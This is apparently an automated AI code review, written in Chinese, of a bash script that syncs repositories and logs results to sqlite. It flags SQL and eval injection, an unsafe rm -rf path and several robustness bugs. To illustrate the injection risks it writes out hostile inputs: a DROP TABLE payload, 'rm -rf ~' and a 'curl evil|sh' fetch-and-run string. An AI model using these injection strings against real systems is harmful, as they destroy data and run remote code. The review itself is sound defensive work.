<!-- deepseek-review -->
## 🤖 DeepSeek Code Review — 🛑 建議修改後再合併

這個 PR 新增了一支 `sandbox/repo_sync.sh`，用來批次同步多個 repo、把結果寫入 sqlite 並產生摘要。整體風險偏高：`sync_one` 內對 `$BRANCH` 的 SQL 拼接未做跳脫，且 `run_hook` 以 `eval` 執行路徑，兩者都可能造成指令／SQL 注入；`cleanup_cache` 的 `rm -rf "$ROOT"/.cache/*` 在 `$ROOT` 為空或含空白時有誤刪風險。此外 `main` 中 `local` 用在函式外層迴圈、`cd` 未還原、`ls` 解析等問題會造成非預期行為。建議先修掉注入與刪除路徑這兩類 blocker 再合併。

### Findings（8 筆）

| | Severity | 位置 | 問題 | 信心 |
|---|---|---|---|---|
| 🛑 | Blocker | `sandbox/repo_sync.sh:47` | SQL 以字串拼接寫入，repo 名稱含單引號會破壞語句 | 0.90 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:56` | run_hook 以 eval 執行路徑，可被 repo 名稱注入指令 | 0.85 |
| 🛑 | Blocker | `sandbox/repo_sync.sh:62` | cleanup_cache 的 rm -rf 在 ROOT 為空時可能誤刪 | 0.80 |
| ⚠️ | Major | `sandbox/repo_sync.sh:88` | 在函式外使用 local，且 cd 未還原會影響後續迭代 | 0.80 |
| ⚠️ | Major | `sandbox/repo_sync.sh:87` | 以 ls 解析目錄名稱，含空白或特殊字元的目錄會被拆開 | 0.75 |
| ⚠️ | Major | `sandbox/repo_sync.sh:38` | git checkout/merge 失敗未檢查，ahead 可能為空導致 INSERT 失敗 | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:68` | summarize 的 grep -c 在 LOG 不存在時輸出 0 但仍回非零，且計數語意不清 | 0.70 |
| 🔸 | Minor | `sandbox/repo_sync.sh:33` | cd 失敗未檢查，後續 git 指令會在錯誤目錄執行 | 0.65 |

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:47</code> SQL 以字串拼接寫入，repo 名稱含單引號會破壞語句</summary>

`INSERT INTO runs VALUES('$name', '$BRANCH', $ahead, datetime('now'))` 直接拼接 `$name`。`$name` 來自 `basename "$dir"`，而 `$dir` 來自 `ls "$ROOT"`，完全未驗證。若某個目錄名為 `a'); DROP TABLE runs;--`，產生的 SQL 會變成 `VALUES('a'); DROP TABLE runs;--', ...`，sqlite3 會執行多語句並刪掉整張表；即使只是名稱含單引號（如 `it's`）也會直接語法錯誤，導致該筆寫入失敗且 `sqlite3` 回非零。建議改用參數化：`sqlite3 "$DB" "INSERT INTO runs VALUES(?1,?2,?3,datetime('now'))" "$name" "$BRANCH" "$ahead"`，或至少對 `$name` 做單引號跳脫。

**判斷依據**：diff 第 45 行直接將 `$name`、`$BRANCH` 內插進 SQL 字串；`$name` 由第 30 行 `basename "$dir"` 取得，未經任何驗證或跳脫。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:56</code> run_hook 以 eval 執行路徑，可被 repo 名稱注入指令</summary>

`eval "$hook $repo"` 會把 `$repo` 當成 shell 程式碼重新解析。`$repo` 是 `$d`（來自 `ls "$ROOT"` 的目錄名），若目錄名為 `x; rm -rf ~` 或 `x$(curl evil|sh)`，`eval` 會直接執行其中的指令。這等於讓任何能在 `$ROOT` 下建立目錄的人取得執行權。建議改成 `"$hook" "$repo"`（不經 eval），若需要多參數也應以陣列傳遞。

**判斷依據**：diff 第 57 行使用 `eval` 並把未驗證的 `$repo` 併入字串；`$repo` 由第 88 行 `run_hook "$d"` 傳入，`$d` 來自第 84 行 `ls "$ROOT"`。

</details>

<details><summary>🛑 <b>Blocker</b> — <code>sandbox/repo_sync.sh:62</code> cleanup_cache 的 rm -rf 在 ROOT 為空時可能誤刪</summary>

`rm -rf "$ROOT"/.cache/*` 在 `$ROOT` 未設定或為空字串時會展開成 `rm -rf /.cache/*`，刪除根目錄下的快取；若 `$ROOT` 含空白或 glob 字元，也會展開成非預期路徑。`main` 只檢查 `$BRANCH` 是否為空，沒有檢查 `$ROOT`。建議在 `main` 開頭加上 `[ -n "$ROOT" ] || { echo 'missing repos-root' >&2; exit 1; }`，並改用 `rm -rf -- "$ROOT/.cache"` 或先確認目錄存在。

**判斷依據**：diff 第 62 行；`main`（第 76-79 行）只驗證 `$BRANCH`，未驗證 `$ROOT`，且 `$ROOT` 直接來自 `$1`。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:88</code> 在函式外使用 local，且 cd 未還原會影響後續迭代</summary>

`local target="$ROOT/$d"` 出現在 `main` 的 `for` 迴圈內、但不在任何函式內（`main` 本身是函式，這行確實在 `main` 內，但 `local` 在迴圈中每次迭代都重新宣告，且 `sync_one` 內第 33 行 `cd "$dir"` 之後從未 `cd` 回原目錄）。結果是第一次迭代後行程的 CWD 變成某個 repo，之後 `ls "$ROOT"` 仍用絕對路徑所以還能跑，但 `run_hook` 的 `$ROOT/.hooks/post-sync` 與 `cleanup_cache` 的相對行為會依 CWD 而異；若 `$ROOT` 是相對路徑，第二次迭代起 `ls "$ROOT"` 就會找不到目錄。建議 `sync_one` 用子 shell `( cd "$dir" && ... )` 或在函式結尾 `cd "$OLDPWD"`，並把 `local` 移出迴圈或改用一般變數。

**判斷依據**：diff 第 88 行；`sync_one` 第 33 行 `cd "$dir"` 無對應還原，`main` 迴圈第 84 行 `for d in $(ls "$ROOT")` 依賴 CWD。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:87</code> 以 ls 解析目錄名稱，含空白或特殊字元的目錄會被拆開</summary>

`for d in $(ls "$ROOT")` 會對 `ls` 輸出做 word splitting 與 glob 展開。若 `$ROOT` 下有目錄名含空白（如 `my repo`），會被拆成兩個迭代，`$ROOT/my` 不存在而 `$ROOT/repo` 也不存在，該 repo 被靜默跳過；若目錄名含 `*` 或 `?` 還會被展開成多個路徑。建議改用 `for target in "$ROOT"/*/; do` 或 `find "$ROOT" -mindepth 1 -maxdepth 1 -type d -print0` 搭配 `while IFS= read -r -d ''`。

**判斷依據**：diff 第 84 行；後續第 85 行 `local target="$ROOT/$d"` 直接依賴 `$d` 為單一完整目錄名。

</details>

<details><summary>⚠️ <b>Major</b> — <code>sandbox/repo_sync.sh:38</code> git checkout/merge 失敗未檢查，ahead 可能為空導致 INSERT 失敗</summary>

`git checkout $BRANCH`、`git merge --ff-only "origin/$BRANCH"` 的退出碼都沒有檢查。若 checkout 失敗（例如本地有衝突的未提交變更）或 merge 非 fast-forward 失敗，腳本仍會繼續執行；接著 `ahead=$(git rev-list --count ... 2>/dev/null)` 在 `origin/$BRANCH` 不存在時會輸出空字串，於是第 45 行的 `$ahead` 變成空值，SQL 變成 `VALUES('name','branch', , datetime('now'))` 而語法錯誤，且第 41 行 `[ "$ahead" -gt 0 ]` 也會因空字串報 `integer expression expected`。建議對每個 git 指令檢查退出碼並在失敗時 `return 1`，並將 `ahead` 預設為 0（`ahead=${ahead:-0}`）。

**判斷依據**：diff 第 38 行（以及第 37 行 checkout）皆未檢查退出碼；第 40 行 `ahead=$(git rev-list --count ...)` 可能為空，第 41、45 行直接使用。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:68</code> summarize 的 grep -c 在 LOG 不存在時輸出 0 但仍回非零，且計數語意不清</summary>

`total=$(grep -c . "$LOG" 2>/dev/null || echo 0)`：當 `$LOG` 不存在時 `grep` 回非零，`|| echo 0` 會再輸出一個 `0`，但 `grep -c` 本身在檔案不存在時不會輸出任何數字，所以結果是 `0`，尚可；然而當 `$LOG` 存在但為空時 `grep -c .` 輸出 `0` 且回非零，`|| echo 0` 會再追加一個 `0`，使 `total` 變成 `0\n0`，第 70 行 `[ "$total" -gt 100 ]` 會報 `integer expression expected`。建議改為 `total=$(grep -c . "$LOG" 2>/dev/null); total=${total:-0}` 或直接用 `wc -l`。

**判斷依據**：diff 第 67 行；`grep -c` 在無匹配時輸出 `0` 並回傳 1，會觸發 `|| echo 0` 造成重複輸出。

</details>

<details><summary>🔸 <b>Minor</b> — <code>sandbox/repo_sync.sh:33</code> cd 失敗未檢查，後續 git 指令會在錯誤目錄執行</summary>

`cd "$dir"` 沒有檢查退出碼。若 `$dir` 因權限或競態（在 `ls` 之後被刪除）而無法進入，`cd` 失敗後 CWD 仍停留在上一個 repo，接著的 `git fetch`、`git checkout`、`git merge` 會對上一個 repo 重複執行，並把結果以新 `$name` 寫入 DB，造成資料錯亂。建議 `cd "$dir" || { echo "cannot cd $dir" >> "$LOG"; return 1; }`。

**判斷依據**：diff 第 33 行；後續第 35-38 行直接執行 git 指令，未確認 CWD 是否正確。

</details>

---

<sub>model `deepseek-flash` ｜ prompt tokens 2520 (cache hit 2304) ｜ completion tokens 2718</sub>